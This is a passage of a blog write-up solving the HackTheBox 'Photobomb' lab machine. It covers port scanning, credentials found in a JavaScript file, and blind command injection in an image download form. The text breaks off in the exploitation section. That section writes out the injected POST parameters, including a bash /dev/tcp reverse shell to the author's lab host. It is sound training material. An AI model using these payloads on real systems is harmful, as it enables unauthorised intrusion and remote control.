<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<!-- iOS Safari -->
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- Chrome, Firefox OS and Opera Status Bar Color -->
<meta name="theme-color" content="#FFFFFF">
<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
<link rel="stylesheet" type="text/css"
  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
<link rel="stylesheet" type="text/css" href="css/theme.css">
<link rel="stylesheet" type="text/css" href="css/notablog.css">
<!-- Favicon -->

  <link rel="shortcut icon" href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b">

<style>
  :root {
    font-size: 20px;
  }
</style>
  <title>HTB Machine — Photobomb&nbsp;|&nbsp;C:\Users\ch3ng &gt;_</title>
  <meta property="og:type" content="blog">
  <meta property="og:title" content="HTB Machine — Photobomb">
  
    <meta name="description" content="Photobomb is an easy Linux box involving some basic web exploitation. It starts with finding credentials in a JavaScript file, which I’ll use to access an image gallery. There’s a command injection vulnerability in the image download function, which can be abused to get a shell. Privesc involves exploiting an insecure script that can be run as sudo.">
    <meta property="og:description" content="Photobomb is an easy Linux box involving some basic web exploitation. It starts with finding credentials in a JavaScript file, which I’ll use to access an image gallery. There’s a command injection vulnerability in the image download function, which can be abused to get a shell. Privesc involves exploiting an insecure script that can be run as sudo.">
  
  
    <meta property="og:image" content="https://labs.hackthebox.com/storage/avatars/52e97c6ca888644478ddcadfcd9f8be5.png">
  
  <style>
    .DateTagBar {
      margin-top: 1.0rem;
    }
  </style>
</head>

<body>
  <nav class="Navbar">
  <a href="/">
    <div class="Navbar__Btn">
      
        <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b"></span>&nbsp;
      
      <span>Home</span>
    </div>
  </a>
  <span class="Navbar__Delim">&centerdot;</span>
  <a href="https://github.com/ch3ng625", target="_blank">
    <div class="Navbar__Btn">
      <span><img class="inline-img-icon" src="icons/github.svg"></span>&nbsp;
      <span>GitHub</span>
    </div>
  </a>
  <span class="Navbar__Delim">&centerdot;</span>
  <a href="https://au.linkedin.com/in/chengw625/", target="_blank">
    <div class="Navbar__Btn">
      <span><img class="inline-img-icon" src="icons/linkedin.png"></span>&nbsp;
      <span>LinkedIn</span>
    </div>
  </a>
  <span class="Navbar__Delim">&centerdot;</span>
  <a href="https://app.hackthebox.com/profile/786447", target="_blank">
    <div class="Navbar__Btn">
      <span><img class="inline-img-icon" src="icons/htb.svg"></span>&nbsp;
      <span>HackTheBox</span>
    </div>
  </a>
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
</nav>

  <header class="Header">
    
    <div class="Header__Spacer Header__Spacer--NoCover">
    </div>
    
      <div class="Header__Icon">
        <span><img class="inline-img-icon" src="https://labs.hackthebox.com/storage/avatars/52e97c6ca888644478ddcadfcd9f8be5.png"></span>
      </div>
    
    <h1 class="Header__Title">HTB Machine — Photobomb</h1>
    
      <div class="DateTagBar">
        
          <span class="DateTagBar__Item DateTagBar__Date">Posted on Sat, Jan 20, 2024</span>
        
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
            <a href="tag/HTB">HTB</a>
          </span>
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--orange">
            <a href="tag/Linux">Linux</a>
          </span>
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--green">
            <a href="tag/Easy">Easy</a>
          </span>
        
      </div>
    
  </header>
  <article id="https://www.notion.so/6a6d7760c67448e8a1ba5f33dcd60acf" class="PageRoot"><h3 id="https://www.notion.so/9239fffbea164419871695ba51566ba4" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/9239fffbea164419871695ba51566ba4"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Summary:</span></span></h3><div id="https://www.notion.so/4a5854e1df40475d9221c020f5c66191" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Photobomb is an easy Linux box involving some basic web exploitation. It starts with finding credentials in a JavaScript file, which I’ll use to access an image gallery. There’s a command injection vulnerability in the image download function, which can be abused to get a shell. Privesc involves exploiting an insecure script that can be run as sudo.</span></span></p></div><div id="https://www.notion.so/6d2d70f5adc14db5bffe5f450c105cfc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/a6680ad1eeeb4623ae436bbe7c5ba712" class="Divider"></div><h3 id="https://www.notion.so/0508d0b0ed074e07a3735581a030cd85" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/0508d0b0ed074e07a3735581a030cd85"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Enumeration:</span></span></h3><div id="https://www.notion.so/23c337c56c7f40a8a19ab33b74d4a033" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Nmap:</strong></span></span></p></div><div id="https://www.notion.so/0914637b6d75414e89017bf7bff72d5e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo nmap --min-rate 1000 -p- 10.129.228.60</code></span></span></p></div><pre id="https://www.notion.so/7fd3c8e73dad47499dd0e7a8c1cf4b74" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-18 22:22 ACDT
Nmap scan report for 10.129.228.60
Host is up (0.26s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 68.31 seconds</span></span></span></code></pre><div id="https://www.notion.so/93592616e0ec41a0be464eddc3693459" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Only SSH and HTTP ports are open for this box. I can target these two ports with script and version scans to get more information.</span></span></p></div><div id="https://www.notion.so/9cc706a26094451abf9910baed082af1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo nmap -A -p 22,80 10.129.228.60</code></span></span></p></div><pre id="https://www.notion.so/76a867c9c84b42aa9afad3f88ebf13a3" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)</span></span></span></code></pre><div id="https://www.notion.so/67b2514f486e48b7b388dfcdecdbc116" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The web redirects to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">photobomb.htb</code></span><span class="SemanticString">, so I added this domain to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/hosts</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/8e5b9ba2898f43c786371bb5361eed9e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span># HTB machine Photobomb
10.129.228.60 photobomb.htb</span></span></span></code></pre><div id="https://www.notion.so/02de530a4bfc4d5e8b23f09b6ab0ddae" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/dab003cb7d60454c95c596e327d4e347" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP80 — HTTP:</strong></span></span></p></div><div id="https://www.notion.so/adf49bb712ad46719ce973b1b1b036bb" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F2dd7b4f9-f50d-49c5-ad98-49c8e1633c9f%2FUntitled.png?width=1636&amp;table=block&amp;id=adf49bb7-12ad-4671-9ce9-73b1b1b036bb"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F2dd7b4f9-f50d-49c5-ad98-49c8e1633c9f%2FUntitled.png?width=1636&amp;table=block&amp;id=adf49bb7-12ad-4671-9ce9-73b1b1b036bb" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/73213c997ade458bb51b62a6e1187623" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This looks like a web app for selling photographs. Clicking on the hyperlink redirects to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/printer</code></span><span class="SemanticString">, where BASIC authentication is required.</span></span></p></div><div id="https://www.notion.so/d48ae24d3ec046f78fd0d109b3e79644" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I tried several default credentials such as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">admin:admin</code></span><span class="SemanticString">, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">root:root</code></span><span class="SemanticString">, and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">admin:password</code></span><span class="SemanticString">, but none of them worked. With nothing else to look at, I inspected the source of the home page.</span></span></p></div><div id="https://www.notion.so/7d0d387fbf2140458255b91464c586cb" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F8ba12f47-0d97-4a64-8ba7-d4a49594d74f%2FUntitled.png?width=1117&amp;table=block&amp;id=7d0d387f-bf21-4045-8255-b91464c586cb"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F8ba12f47-0d97-4a64-8ba7-d4a49594d74f%2FUntitled.png?width=1117&amp;table=block&amp;id=7d0d387f-bf21-4045-8255-b91464c586cb" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/7573a57d5770465ebb4f3ffd8c19f823" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It’s surprisingly simple, with only a single JavaScript file loaded. Inspecting it would reveal credentials for the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/printer</code></span><span class="SemanticString"> page: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">pH0t0:b0Mb!</code></span></span></p></div><div id="https://www.notion.so/962777379f2f4c19958be1462e863bce" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F3be92df2-5d08-4f21-98c3-5a12f0cd8d4a%2FUntitled.png?width=929&amp;table=block&amp;id=96277737-9f2f-4c19-958b-e1462e863bce"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F3be92df2-5d08-4f21-98c3-5a12f0cd8d4a%2FUntitled.png?width=929&amp;table=block&amp;id=96277737-9f2f-4c19-958b-e1462e863bce" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/3cc44fb60d6b49508cdee96a2f0da57e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With the credentials, the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/printer</code></span><span class="SemanticString"> page can be accessed. As expected, it’s a photo gallery.</span></span></p></div><div id="https://www.notion.so/f94a3f4795b041ce984fceebb3283302" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F09984ad3-268f-4c51-9019-9eb90e8c1ccc%2FUntitled.png?width=1908&amp;table=block&amp;id=f94a3f47-95b0-41ce-984f-ceebb3283302"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F09984ad3-268f-4c51-9019-9eb90e8c1ccc%2FUntitled.png?width=1908&amp;table=block&amp;id=f94a3f47-95b0-41ce-984f-ceebb3283302" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/d5363b1182b84b26bf36d7be49210574" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The bottom of the page has a download button, with options for file types and dimensions.</span></span></p></div><div id="https://www.notion.so/42a31f07850b4960a85047be99a60c8c" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F441551a4-b9b4-4501-bb49-4ffb859e3bf7%2FUntitled.png?width=1418&amp;table=block&amp;id=42a31f07-850b-4960-a850-47be99a60c8c"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F441551a4-b9b4-4501-bb49-4ffb859e3bf7%2FUntitled.png?width=1418&amp;table=block&amp;id=42a31f07-850b-4960-a850-47be99a60c8c" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/40ed9a5dcdb64ab2a3f788dd8620de12" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I downloaded one of them and used </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">exiftool</code></span><span class="SemanticString"> to analyze it, but nothing useful was found.</span></span></p></div><div id="https://www.notion.so/01d8586a5b7c4a079d8b3fbf8a2e2a82" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Looking at the intercepted request, it’s sending the download options via POST parameters.</span></span></p></div><div id="https://www.notion.so/b65dfa92e0f1470d978fc83c2a34e980" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F1a3f381c-e2e3-471c-9198-2222343db9fe%2FUntitled.png?width=799&amp;table=block&amp;id=b65dfa92-e0f1-470d-978f-c83c2a34e980"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F1a3f381c-e2e3-471c-9198-2222343db9fe%2FUntitled.png?width=799&amp;table=block&amp;id=b65dfa92-e0f1-470d-978f-c83c2a34e980" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/e25dab3cf75744189262c284f389eee6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’m guessing that the backend server is using OS commands such as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">convert</code></span><span class="SemanticString"> to convert images into the correct dimensions and types, for example:</span></span></p></div><pre id="https://www.notion.so/505293e06d4143a39c09fef11ede564b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>convert <span class="token operator">&lt;</span>photo<span class="token operator">></span> <span class="token parameter variable">-resize</span> <span class="token operator">&lt;</span>dimensions<span class="token operator">></span> name.<span class="token operator">&lt;</span>filetype<span class="token operator">></span></span></span></span></code></pre><div id="https://www.notion.so/df5ec63c4e454ebe983e613a81fc6120" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Command injection would be possible if any of the parameters aren’t properly sanitized.</span></span></p></div><div id="https://www.notion.so/e2a16afacafa46e2858f4ca24a761f8a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I tested this by injecting a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">;</code></span><span class="SemanticString"> at the end of the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">photo</code></span><span class="SemanticString"> parameter, but the server came back instantly with a specific error “Source photo does not exist”. Seems like this parameter is being sanitized properly. I also attempted directory traversal, but it was also unsuccessful.</span></span></p></div><div id="https://www.notion.so/e22751c705f241e7bf98d74d3cf021ce" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F83d03655-bd92-47c2-9b56-466220ebdb50%2FUntitled.png?width=1627&amp;table=block&amp;id=e22751c7-05f2-41e7-bf98-d74d3cf021ce"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F83d03655-bd92-47c2-9b56-466220ebdb50%2FUntitled.png?width=1627&amp;table=block&amp;id=e22751c7-05f2-41e7-bf98-d74d3cf021ce" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/8f578897872940b9b6c30b617bebd115" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Same results for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">dimensions</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/0c10a127df4f434d95b4320cfc1639a3" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F8d9c71ec-228c-40fa-bf71-1408ff8f56da%2FUntitled.png?width=1621&amp;table=block&amp;id=0c10a127-df4f-434d-95b4-320cfc1639a3"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F8d9c71ec-228c-40fa-bf71-1408ff8f56da%2FUntitled.png?width=1621&amp;table=block&amp;id=0c10a127-df4f-434d-95b4-320cfc1639a3" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/04a28bb85cbf422cafee6588a8720b66" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">filetype</code></span><span class="SemanticString"> however, took around 6 seconds to respond with a generic error message. This implies that the injected </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">;</code></span><span class="SemanticString"> may have been included in the backend command, breaking it in the process.</span></span></p></div><div id="https://www.notion.so/598887261dd74deca39d1edbeea308f7" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F1a0c783b-34c2-496f-9e87-621572c06199%2FUntitled.png?width=1911&amp;table=block&amp;id=59888726-1dd7-4dec-a39d-1edbeea308f7"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F1a0c783b-34c2-496f-9e87-621572c06199%2FUntitled.png?width=1911&amp;table=block&amp;id=59888726-1dd7-4dec-a39d-1edbeea308f7" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/d69952023af5493e9b69feedd6698bba" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/8b8d9ba3b7d345cf81ef346df392cb6e" class="Divider"></div><h3 id="https://www.notion.so/43743653a5d74e2798b5b4f6999fc746" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/43743653a5d74e2798b5b4f6999fc746"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Exploitation:</span></span></h3><div id="https://www.notion.so/3d4d236c300e44ea934d3a65890e1738" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">OS Command Injection:</strong></span></span></p></div><div id="https://www.notion.so/d33b3cab2f0d48e7bb70297b9af0e35e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Since it’s a blind injection, I won’t see the command output. To confirm code execution, I first set up a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">tcpdump</code></span><span class="SemanticString"> listener on my host.</span></span></p></div><div id="https://www.notion.so/23e218fb84aa41398663dbbdefedf55d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo tcpdump -i tun0</code></span></span></p></div><div id="https://www.notion.so/c6a1ee961ac34ceca8d2ac9fffac30f3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Then I sent the following POST request to the server with an injected </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ping</code></span><span class="SemanticString"> command.</span></span></p></div><pre id="https://www.notion.so/25b65972018a4436acef7505859bd2cb" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token assign-left variable">photo</span><span class="token operator">=</span>eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg<span class="token operator">&amp;</span><span class="token assign-left variable">filetype</span><span class="token operator">=</span>png<span class="token punctuation">;</span>ping+-c+5+10.10.14.27<span class="token operator">&amp;</span><span class="token assign-left variable">dimensions</span><span class="token operator">=</span>3000x2000</span></span></span></code></pre><div id="https://www.notion.so/9498f88bf1354337abfa9a8eb01a8a4f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And my listener instantly filled up with ICMP requests.</span></span></p></div><div id="https://www.notion.so/670bfff11ea14f21b1fb5e7d905ecae5" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F63d0c5ea-7d8f-4fc1-901d-7da224fefe63%2FUntitled.png?width=764&amp;table=block&amp;id=670bfff1-1ea1-4f21-b1fb-5e7d905ecae5"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F63d0c5ea-7d8f-4fc1-901d-7da224fefe63%2FUntitled.png?width=764&amp;table=block&amp;id=670bfff1-1ea1-4f21-b1fb-5e7d905ecae5" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/089aa37f9e2f4240b751e9cad3ece6a5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Great, we have RCE!</span></span></p></div><div id="https://www.notion.so/966a36271cdf4ea4ad5789bcec3a1bbf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">For a shell, I first set up a listener on port 8001:</span></span></p></div><div id="https://www.notion.so/898e95a26bec47beb0daf5986a5f6e41" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo nc -lvnp 8001</code></span></span></p></div><div id="https://www.notion.so/e015a4d6e2e54fe2867ce38f2623b777" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Then I sent the following POST request with a reverse shell payload.</span></span></p></div><pre id="https://www.notion.so/4d7e248ef93c4140bb7d012772971082" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token assign-left variable">photo</span><span class="token operator">=</span>eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg<span class="token operator">&amp;</span><span class="token assign-left variable">filetype</span><span class="token operator">=</span>png<span class="token punctuation">;</span>bash+-c+<span class="token string">'bash+-i+>%26+/dev/tcp/10.10.14.27/8001+0>%261'</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token assign-left variable">dimensions</span><span class="token operator">=</span>3000x2000</span></span></span></code></pre><div id="https://www.notion.so/87206ea018484a4986f1adc72c4a7649" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fb9a0ea7a-bc9b-4a90-93bf-237ef03144aa%2FUntitled.png?width=811&amp;table=block&amp;id=87206ea0-1848-4a49-86f1-adc72c4a7649"><img 